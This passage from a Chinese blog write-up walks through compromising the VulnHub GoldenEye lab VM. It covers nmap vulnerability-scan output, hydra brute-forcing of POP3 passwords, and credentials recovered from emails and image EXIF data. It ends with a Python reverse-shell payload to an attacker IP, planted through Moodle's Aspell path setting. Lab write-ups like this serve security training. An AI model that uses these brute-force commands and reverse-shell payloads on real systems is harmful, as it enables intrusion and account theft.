class="line">|   </span><br><span class="line">|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  BID:74733  CVE:CVE-2015-4000</span><br><span class="line">|       The Transport Layer Security (TLS) protocol contains a flaw that is</span><br><span class="line">|       triggered when handling Diffie-Hellman key exchanges defined with</span><br><span class="line">|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker</span><br><span class="line">|       to downgrade the security of a TLS session to 512-bit <span class="built_in">export</span>-grade</span><br><span class="line">|       cryptography, <span class="built_in">which</span> is significantly weaker, allowing the attacker</span><br><span class="line">|       to more easily <span class="built_in">break</span> the encryption and monitor or tamper with</span><br><span class="line">|       the encrypted stream.</span><br><span class="line">|     Disclosure date: 2015-5-19</span><br><span class="line">|     Check results:</span><br><span class="line">|       EXPORT-GRADE DH GROUP 1</span><br><span class="line">|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA</span><br><span class="line">|             Modulus Type: Safe prime</span><br><span class="line">|             Modulus Source: Unknown/Custom-generated</span><br><span class="line">|             Modulus Length: 512</span><br><span class="line">|             Generator Length: 8</span><br><span class="line">|             Public Key Length: 512</span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000</span><br><span class="line">|       https://weakdh.org</span><br><span class="line">|       https://www.securityfocus.com/bid/74733</span><br><span class="line">|   </span><br><span class="line">|   Diffie-Hellman Key Exchange Insufficient Group Strength</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|       Transport Layer Security (TLS) services that use Diffie-Hellman groups</span><br><span class="line">|       of insufficient strength, especially those using one of a few commonly</span><br><span class="line">|       shared groups, may be susceptible to passive eavesdropping attacks.</span><br><span class="line">|     Check results:</span><br><span class="line">|       WEAK DH GROUP 1</span><br><span class="line">|             Cipher Suite: TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA</span><br><span class="line">|             Modulus Type: Safe prime</span><br><span class="line">|             Modulus Source: postfix <span class="built_in">builtin</span></span><br><span class="line">|             Modulus Length: 1024</span><br><span class="line">|             Generator Length: 8</span><br><span class="line">|             Public Key Length: 1024</span><br><span class="line">|     References:</span><br><span class="line">|_      https://weakdh.org</span><br><span class="line">| ssl-poodle: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   SSL POODLE information leak</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  BID:70574  CVE:CVE-2014-3566</span><br><span class="line">|           The SSL protocol 3.0, as used <span class="keyword">in</span> OpenSSL through 1.0.1i and other</span><br><span class="line">|           products, uses nondeterministic CBC padding, <span class="built_in">which</span> makes it easier</span><br><span class="line">|           <span class="keyword">for</span> man-in-the-middle attackers to obtain cleartext data via a</span><br><span class="line">|           padding-oracle attack, aka the <span class="string">&quot;POODLE&quot;</span> issue.</span><br><span class="line">|     Disclosure date: 2014-10-14</span><br><span class="line">|     Check results:</span><br><span class="line">|       TLS_RSA_WITH_AES_128_CBC_SHA</span><br><span class="line">|     References:</span><br><span class="line">|       https://www.imperialviolet.org/2014/10/14/poodle.html</span><br><span class="line">|       https://www.securityfocus.com/bid/70574</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</span><br><span class="line">|_      https://www.openssl.org/~bodo/ssl-poodle.pdf</span><br><span class="line">|_sslv2-drown: </span><br><span class="line">80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">|_http-server-header: Apache/2.4.7 (Ubuntu)</span><br><span class="line">| http-slowloris-check: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Slowloris DOS attack</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2007-6750</span><br><span class="line">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="line">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="line">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       the http server<span class="string">&#x27;s resources causing Denial Of Service.</span></span><br><span class="line"><span class="string">|       </span></span><br><span class="line"><span class="string">|     Disclosure date: 2009-09-17</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span></span><br><span class="line"><span class="string">|_      http://ha.ckers.org/slowloris/</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">55006/tcp open  ssl/unknown</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| ssl-dh-params: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Diffie-Hellman Key Exchange Insufficient Group Strength</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|       Transport Layer Security (TLS) services that use Diffie-Hellman groups</span><br><span class="line">|       of insufficient strength, especially those using one of a few commonly</span><br><span class="line">|       shared groups, may be susceptible to passive eavesdropping attacks.</span><br><span class="line">|     Check results:</span><br><span class="line">|       WEAK DH GROUP 1</span><br><span class="line">|             Cipher Suite: TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA</span><br><span class="line">|             Modulus Type: Safe prime</span><br><span class="line">|             Modulus Source: Unknown/Custom-generated</span><br><span class="line">|             Modulus Length: 1024</span><br><span class="line">|             Generator Length: 8</span><br><span class="line">|             Public Key Length: 1024</span><br><span class="line">|     References:</span><br><span class="line">|_      https://weakdh.org</span><br><span class="line">| ssl-poodle: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   SSL POODLE information leak</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  BID:70574  CVE:CVE-2014-3566</span><br><span class="line">|           The SSL protocol 3.0, as used <span class="keyword">in</span> OpenSSL through 1.0.1i and other</span><br><span class="line">|           products, uses nondeterministic CBC padding, <span class="built_in">which</span> makes it easier</span><br><span class="line">|           <span class="keyword">for</span> man-in-the-middle attackers to obtain cleartext data via a</span><br><span class="line">|           padding-oracle attack, aka the <span class="string">&quot;POODLE&quot;</span> issue.</span><br><span class="line">|     Disclosure date: 2014-10-14</span><br><span class="line">|     Check results:</span><br><span class="line">|       TLS_RSA_WITH_AES_128_CBC_SHA</span><br><span class="line">|     References:</span><br><span class="line">|       https://www.imperialviolet.org/2014/10/14/poodle.html</span><br><span class="line">|       https://www.securityfocus.com/bid/70574</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</span><br><span class="line">|_      https://www.openssl.org/~bodo/ssl-poodle.pdf</span><br><span class="line">|_sslv2-drown: </span><br><span class="line">55007/tcp open  pop3        Dovecot pop3d</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| ssl-dh-params: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Diffie-Hellman Key Exchange Insufficient Group Strength</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|       Transport Layer Security (TLS) services that use Diffie-Hellman groups</span><br><span class="line">|       of insufficient strength, especially those using one of a few commonly</span><br><span class="line">|       shared groups, may be susceptible to passive eavesdropping attacks.</span><br><span class="line">|     Check results:</span><br><span class="line">|       WEAK DH GROUP 1</span><br><span class="line">|             Cipher Suite: TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA</span><br><span class="line">|             Modulus Type: Safe prime</span><br><span class="line">|             Modulus Source: Unknown/Custom-generated</span><br><span class="line">|             Modulus Length: 1024</span><br><span class="line">|             Generator Length: 8</span><br><span class="line">|             Public Key Length: 1024</span><br><span class="line">|     References:</span><br><span class="line">|_      https://weakdh.org</span><br><span class="line">| ssl-poodle: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   SSL POODLE information leak</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  BID:70574  CVE:CVE-2014-3566</span><br><span class="line">|           The SSL protocol 3.0, as used <span class="keyword">in</span> OpenSSL through 1.0.1i and other</span><br><span class="line">|           products, uses nondeterministic CBC padding, <span class="built_in">which</span> makes it easier</span><br><span class="line">|           <span class="keyword">for</span> man-in-the-middle attackers to obtain cleartext data via a</span><br><span class="line">|           padding-oracle attack, aka the <span class="string">&quot;POODLE&quot;</span> issue.</span><br><span class="line">|     Disclosure date: 2014-10-14</span><br><span class="line">|     Check results:</span><br><span class="line">|       TLS_RSA_WITH_AES_128_CBC_SHA</span><br><span class="line">|     References:</span><br><span class="line">|       https://www.imperialviolet.org/2014/10/14/poodle.html</span><br><span class="line">|       https://www.securityfocus.com/bid/70574</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</span><br><span class="line">|_      https://www.openssl.org/~bodo/ssl-poodle.pdf</span><br><span class="line">|_sslv2-drown:</span><br></pre></td></tr></table></figure>

<p>是时候深入挖掘了！在页面的HTML源代码中，找出了负责漂亮的首页动画的JavaScript文件。在terminal.js上，我找到了第一个提示。用于以HTML编码编码的boris的硬编码密码，这对于解码非常简单。我获得了访问该应用程序的凭据。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub133.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub134.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub135.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&amp;<span class="comment">#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;</span></span><br><span class="line"></span><br><span class="line">===&gt;</span><br><span class="line"></span><br><span class="line">InvincibleHack3r</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到账号密码：boris/InvincibleHack3r，然后登录</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub136.jpg"></p>
<p>访问该应用程序没有任何用处。尝试使用相同的凭据访问pop3服务，并检查了鲍里斯经纪人是否有任何有趣的电子邮件。但是，获得的密码不适合用于pop3访问。老实说，在这里停留了一段时间。<br>没有其他线索，对使用用户名boris的pop3服务进行了快速的暴力破解。Hydra能够使用Kali中存在的fasttrack.txt单词列表来破解密码。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># hydra -l boris -P /usr/share/wordlists/fasttrack.txt -t20 192.168.56.101 -s55007 -I pop3Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</span></span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-01-09 21:37:45</span><br><span class="line">[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!</span><br><span class="line">[DATA] max 20 tasks per 1 server, overall 20 tasks, 222 login tries (l:1/p:222), ~12 tries per task</span><br><span class="line">[DATA] attacking pop3://192.168.56.101:55007/</span><br><span class="line">[STATUS] 100.00 tries/min, 100 tries <span class="keyword">in</span> 00:01h, 122 to <span class="keyword">do</span> <span class="keyword">in</span> 00:02h, 20 active</span><br><span class="line">[55007][pop3] host: 192.168.56.101   login: boris   password: secret1!</span><br><span class="line">[STATUS] 111.00 tries/min, 222 tries <span class="keyword">in</span> 00:02h, 1 to <span class="keyword">do</span> <span class="keyword">in</span> 00:01h, 19 active</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-01-09 21:39:45</span><br></pre></td></tr></table></figure>

<p>得到boris/secret1!，然后telnet连接</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># telnet 192.168.56.101 55007</span></span><br><span class="line">Trying 192.168.56.101...</span><br><span class="line">Connected to 192.168.56.101.</span><br><span class="line">Escape character is <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line">+OK GoldenEye POP3 Electronic-Mail System</span><br><span class="line">user boris</span><br><span class="line">+OK</span><br><span class="line">pass secret1!</span><br><span class="line">+OK Logged <span class="keyword">in</span>.</span><br><span class="line">retr 1</span><br><span class="line">+OK 544 octets</span><br><span class="line">Return-Path: &lt;root@127.0.0.1.goldeneye&gt;</span><br><span class="line">X-Original-To: boris</span><br><span class="line">Delivered-To: boris@ubuntu</span><br><span class="line">Received: from ok (localhost [127.0.0.1])</span><br><span class="line">        by ubuntu (Postfix) with SMTP id D9E47454B1</span><br><span class="line">        <span class="keyword">for</span> &lt;boris&gt;; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)</span><br><span class="line">Message-Id: &lt;20180425022326.D9E47454B1@ubuntu&gt;</span><br><span class="line">Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)</span><br><span class="line">From: root@127.0.0.1.goldeneye</span><br><span class="line"></span><br><span class="line">Boris, this is admin. You can electronically communicate to co-workers and students here. I<span class="string">&#x27;m not going to scan emails for security risks because I trust you and the other admins here.</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">retr 2</span></span><br><span class="line"><span class="string">+OK 373 octets</span></span><br><span class="line"><span class="string">Return-Path: &lt;natalya@ubuntu&gt;</span></span><br><span class="line"><span class="string">X-Original-To: boris</span></span><br><span class="line"><span class="string">Delivered-To: boris@ubuntu</span></span><br><span class="line"><span class="string">Received: from ok (localhost [127.0.0.1])</span></span><br><span class="line"><span class="string">        by ubuntu (Postfix) with ESMTP id C3F2B454B1</span></span><br><span class="line"><span class="string">        for &lt;boris&gt;; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)</span></span><br><span class="line"><span class="string">Message-Id: &lt;20180425024249.C3F2B454B1@ubuntu&gt;</span></span><br><span class="line"><span class="string">Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)</span></span><br><span class="line"><span class="string">From: natalya@ubuntu</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Boris, I can break your codes!</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">retr 3</span></span><br><span class="line"><span class="string">+OK 921 octets</span></span><br><span class="line"><span class="string">Return-Path: &lt;alec@janus.boss&gt;</span></span><br><span class="line"><span class="string">X-Original-To: boris</span></span><br><span class="line"><span class="string">Delivered-To: boris@ubuntu</span></span><br><span class="line"><span class="string">Received: from janus (localhost [127.0.0.1])</span></span><br><span class="line"><span class="string">        by ubuntu (Postfix) with ESMTP id 4B9F4454B1</span></span><br><span class="line"><span class="string">        for &lt;boris&gt;; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)</span></span><br><span class="line"><span class="string">Message-Id: &lt;20180425025235.4B9F4454B1@ubuntu&gt;</span></span><br><span class="line"><span class="string">Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)</span></span><br><span class="line"><span class="string">From: alec@janus.boss</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Boris,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">PS - Keep security tight or we will be compromised.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.</span></span><br></pre></td></tr></table></figure>

<p>电子邮件通讯的内容不可直接利用，但能够找出执行任务的其他特工的用户名。这也可以用于对其他代理发起相同的攻击。很幸运找到了natalya。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># hydra -l natalya -P /usr/share/wordlists/fasttrack.txt -t64 192.168.56.101 -s55007 -I pop3</span></span><br><span class="line">Hydra v9.0 (c) 2019 by van Hauser/THC - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-01-09 21:46:23</span><br><span class="line">[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!</span><br><span class="line">[DATA] max 64 tasks per 1 server, overall 64 tasks, 222 login tries (l:1/p:222), ~4 tries per task</span><br><span class="line">[DATA] attacking pop3://192.168.56.101:55007/</span><br><span class="line">[55007][pop3] host: 192.168.56.101   login: natalya   password: bird</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-01-09 21:46:39</span><br></pre></td></tr></table></figure>

<p>natalya/bird，登录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># telnet 192.168.56.101 55007</span></span><br><span class="line">Trying 192.168.56.101...</span><br><span class="line">Connected to 192.168.56.101.</span><br><span class="line">Escape character is <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line">+OK GoldenEye POP3 Electronic-Mail System</span><br><span class="line">user natalya</span><br><span class="line">+OK</span><br><span class="line">pass bird</span><br><span class="line">+OK Logged <span class="keyword">in</span>.</span><br><span class="line">retr 1</span><br><span class="line">+OK 631 octets</span><br><span class="line">Return-Path: &lt;root@ubuntu&gt;</span><br><span class="line">X-Original-To: natalya</span><br><span class="line">Delivered-To: natalya@ubuntu</span><br><span class="line">Received: from ok (localhost [127.0.0.1])</span><br><span class="line">        by ubuntu (Postfix) with ESMTP id D5EDA454B1</span><br><span class="line">        <span class="keyword">for</span> &lt;natalya&gt;; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)</span><br><span class="line">Message-Id: &lt;20180425024542.D5EDA454B1@ubuntu&gt;</span><br><span class="line">Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)</span><br><span class="line">From: root@ubuntu</span><br><span class="line"></span><br><span class="line">Natalya, please you need to stop breaking boris<span class="string">&#x27; codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">retr 2</span></span><br><span class="line"><span class="string">+OK 1048 octets</span></span><br><span class="line"><span class="string">Return-Path: &lt;root@ubuntu&gt;</span></span><br><span class="line"><span class="string">X-Original-To: natalya</span></span><br><span class="line"><span class="string">Delivered-To: natalya@ubuntu</span></span><br><span class="line"><span class="string">Received: from root (localhost [127.0.0.1])</span></span><br><span class="line"><span class="string">        by ubuntu (Postfix) with SMTP id 17C96454B1</span></span><br><span class="line"><span class="string">        for &lt;natalya&gt;; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)</span></span><br><span class="line"><span class="string">Message-Id: &lt;20180425031956.17C96454B1@ubuntu&gt;</span></span><br><span class="line"><span class="string">Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)</span></span><br><span class="line"><span class="string">From: root@ubuntu</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it&#x27;</span>s related to security...even <span class="keyword">if</span> it<span class="string">&#x27;s not, just enter it in under the guise of &quot;security&quot;...it&#x27;</span>ll get the change order escalated without much hassle :)</span><br><span class="line"></span><br><span class="line">Ok, user creds are:</span><br><span class="line"></span><br><span class="line">username: xenia</span><br><span class="line">password: RCP90rulez!</span><br><span class="line"></span><br><span class="line">Boris verified her as a valid contractor so just create the account ok?</span><br><span class="line"></span><br><span class="line">And <span class="keyword">if</span> you didn<span class="string">&#x27;t have the URL on outr internal Domain: severnaya-station.com/gnocertdir</span></span><br><span class="line"><span class="string">**Make sure to edit your host file since you usually work remote off-network....</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Since you&#x27;</span>re a Linux user just point this servers IP to severnaya-station.com <span class="keyword">in</span> /etc/hosts.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.</span><br></pre></td></tr></table></figure>

<p>将关键信息retr 2翻译</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">好的，娜塔琳，我为你准备了一个新学生。由于这是一个新系统，请让我或鲍里斯知道您是否发现任何配置问题，尤其是它与安全性有关……即使不是与安全有关，也可以以“安全性”为名输入它……无需太多麻烦就可以将变更单升级：)</span><br><span class="line">好的，用户凭证是：</span><br><span class="line"></span><br><span class="line">用户名：xenia</span><br><span class="line">密码：RCP90rulez!</span><br><span class="line"></span><br><span class="line">鲍里斯（Boris）确认她是有效承包商，所以只需创建帐户就可以了吗？如果您没有外部内部域上的URL，请访问：severnaya-station.com/gnocertdir</span><br><span class="line"></span><br><span class="line">**请确保编辑您的主机文件，因为您通常在远程网络外工作。由于您是Linux用户，只需将此服务器IP指向/etc/hosts中的severnaya-station.com。</span><br></pre></td></tr></table></figure>

<p>修改hosts文件将ip:192.168.56.101指向severnaya-station.com，然后访问域名severnaya-station.com/gnocertdir</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub137.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub138.jpg"></p>
<p>现在，我可以浏览到severnaya-station.com/gnocertdir以xenia的形式访问培训门户。学习门户使用开源学习平台Moodle托管。无法从门户访问任何课程资料或附件。但是，来自GoldenEye项目主管的Doak博士发了言。他在消息中说，他的电子邮件用户名不正确。我在pop3服务上使用hydra尝试了攻击。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub139.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># hydra -l doak -P /usr/share/wordlists/fasttrack.txt -t64 192.168.56.101 -s55007 -I pop3Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</span></span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-01-09 22:21:03</span><br><span class="line">[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!</span><br><span class="line">[DATA] max 64 tasks per 1 server, overall 64 tasks, 222 login tries (l:1/p:222), ~4 tries per task</span><br><span class="line">[DATA] attacking pop3://192.168.56.101:55007/</span><br><span class="line">[55007][pop3] host: 192.168.56.101   login: doak   password: goat</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-01-09 22:21:32</span><br></pre></td></tr></table></figure>

<p>doak/goat,</p>
<p>那是特勤人员可以使用的最愚蠢的密码！不过，我可以使用新发现的凭据访问电子邮件通信。通过电子邮件通信，我发现了以代理Doak身份访问moodle的凭据。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># telnet 192.168.56.101 55007</span></span><br><span class="line">Trying 192.168.56.101...</span><br><span class="line">Connected to 192.168.56.101.</span><br><span class="line">Escape character is <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line">+OK GoldenEye POP3 Electronic-Mail System</span><br><span class="line">user doak</span><br><span class="line">+OK</span><br><span class="line">pass goat</span><br><span class="line">+OK Logged <span class="keyword">in</span>.</span><br><span class="line">retr 1</span><br><span class="line">+OK 606 octets</span><br><span class="line">Return-Path: &lt;doak@ubuntu&gt;</span><br><span class="line">X-Original-To: doak</span><br><span class="line">Delivered-To: doak@ubuntu</span><br><span class="line">Received: from doak (localhost [127.0.0.1])</span><br><span class="line">        by ubuntu (Postfix) with SMTP id 97DC24549D</span><br><span class="line">        <span class="keyword">for</span> &lt;doak&gt;; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)</span><br><span class="line">Message-Id: &lt;20180425034731.97DC24549D@ubuntu&gt;</span><br><span class="line">Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)</span><br><span class="line">From: doak@ubuntu</span><br><span class="line"></span><br><span class="line">James,</span><br><span class="line">If you<span class="string">&#x27;re reading this, congrats you&#x27;</span>ve gotten this far. You know how tradecraft works right?</span><br><span class="line"></span><br><span class="line">Because I don<span class="string">&#x27;t. Go to our training site and login to my account....dig until you can exfiltrate further information......</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">username: dr_doak</span></span><br><span class="line"><span class="string">password: 4England!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.</span></span><br></pre></td></tr></table></figure>

<p>username: dr_doak<br>password: 4England!</p>
<p>我在Doak博士的帐户中发现了一个有趣的附件，该附件说可以从/dir007key/for-007.jpg获取应用程序的管理员凭据。使用隐写术，可以将秘密消息嵌入图像中。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub140.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/007.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># exiftool 007.jpg </span></span><br><span class="line">ExifTool Version Number         : 11.80</span><br><span class="line">File Name                       : 007.jpg</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 15 kB</span><br><span class="line">File Modification Date/Time     : 2020:01:09 22:37:50-05:00</span><br><span class="line">File Access Date/Time           : 2020:01:09 22:37:50-05:00</span><br><span class="line">File Inode Change Date/Time     : 2020:01:09 22:37:50-05:00</span><br><span class="line">File Permissions                : rw-r--r--</span><br><span class="line">File Type                       : JPEG</span><br><span class="line">File Type Extension             : jpg</span><br><span class="line">MIME Type                       : image/jpeg</span><br><span class="line">JFIF Version                    : 1.01</span><br><span class="line">X Resolution                    : 300</span><br><span class="line">Y Resolution                    : 300</span><br><span class="line">Exif Byte Order                 : Big-endian (Motorola, MM)</span><br><span class="line">Image Description               : eFdpbnRlcjE5OTV4IQ==</span><br><span class="line">Make                            : GoldenEye</span><br><span class="line">Resolution Unit                 : inches</span><br><span class="line">Software                        : linux</span><br><span class="line">Artist                          : For James</span><br><span class="line">Y Cb Cr Positioning             : Centered</span><br><span class="line">Exif Version                    : 0231</span><br><span class="line">Components Configuration        : Y, Cb, Cr, -</span><br><span class="line">User Comment                    : For 007</span><br><span class="line">Flashpix Version                : 0100</span><br><span class="line">Image Width                     : 313</span><br><span class="line">Image Height                    : 212</span><br><span class="line">Encoding Process                : Baseline DCT, Huffman coding</span><br><span class="line">Bits Per Sample                 : 8</span><br><span class="line">Color Components                : 3</span><br><span class="line">Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)</span><br><span class="line">Image Size                      : 313x212</span><br><span class="line">Megapixels                      : 0.066</span><br></pre></td></tr></table></figure>

<p>将Image Description的base64字符串解码得到:xWinter1995x!</p>
<p>然后使用admin/xWinter1995x!登录即可</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub141.jpg"></p>
<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><ul>
<li>moodle管理员账户远程代码执行</li>
</ul>
<p>在获得对moodle的管理员访问权后，获得reverse shell相当容易。在“moodle”设置上，存在用于配置系统路径的设置。Aspell是拼写检查器，可以安装在Linux上，并且可以在moodle中用于进行拼写检查操作。每当启动拼写检查动作时，moodle就会调用Aspell二进制文件。可以编辑Aspell的路径以获得reverse shell。以下是我使用的payload。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.56.102&quot;,5566));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub142.jpg"></p>
<p>正确设置路径后，即可创建任何博客文章或页面。在编辑器上，可以调用spellcheck函数以获得reverse shell连接。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub143.jpg"></p>
<p>然后将下图所示设置选项设置成:PspellShell，不设置的话，无法执行之前的payload…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub144.jpg"></p>
<p>点击上图的按钮之后kali端返回了shell.</p>
